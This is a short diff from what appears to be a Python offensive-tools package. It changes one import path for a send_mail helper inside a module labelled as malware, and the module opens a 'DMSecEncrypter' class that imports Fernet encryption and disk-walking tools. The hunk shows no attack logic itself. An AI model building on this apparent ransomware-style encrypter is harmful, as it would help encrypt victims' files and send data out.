@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 from os import walk, environ
 from os.path import join
 from psutil import disk_partitions
-from pyhtools.evil_files.malwares.utils import send_mail
+from pyhtools_evil_files.malwares.utils import send_mail
 
 
 class DMSecEncrypter:
